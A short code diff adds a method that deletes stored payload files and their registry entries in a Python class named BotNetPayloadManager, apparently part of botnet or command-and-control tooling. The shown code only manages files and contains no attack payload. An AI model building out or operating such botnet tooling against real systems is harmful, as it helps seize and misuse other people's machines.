@@ -79,3 +79,15 @@ class BotNetPayloadManager:
         with open(self.payloadfiles[payload], "r") as f:
             payloadtext = f.read()
             return vartext + payloadtext
+
+    def deletePayload(self, payload):
+        for root, dirs, files in os.walk(self.payloadpath):
+            for file in files:
+                if file == payload:
+                     filepath = os.path.join(root, file)
+                     name, desc = self.parsePayload(filepath)
+                     del self.payloaddescriptions[name]
+                     del self.payloadfiles[name]
+                     os.remove(filepath)
+                     return True
+        return False
